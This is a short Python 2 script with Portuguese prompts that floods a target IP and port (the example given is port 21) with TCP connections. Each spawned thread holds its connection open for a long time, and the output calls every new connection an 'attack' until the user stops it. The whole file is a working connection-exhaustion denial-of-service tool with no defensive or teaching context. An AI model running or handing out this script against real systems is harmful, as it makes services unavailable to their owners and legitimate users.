
#!/usr/bin/python

import socket
import sys
from time import sleep
from thread import start_new_thread

if len(sys.argv) != 3:
    print "Informe IP e Porta"
    print "Exemplo: "+sys.argv[0]+"10.0.0.1 21"
    sys.exit()

def conn(b):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    sleep(10000)
    s.close()
    thread.exit()

number = 0

while(1):
    try:
        start_new_thread(conn,(None, ))
        sleep(0.1)
        number = number + 1
        print "Enviando ataque %s - CTRL+C para parar o ataque" % str(number)
    except socket.error:
        print ("Sistema sem resposta")
        exit(1)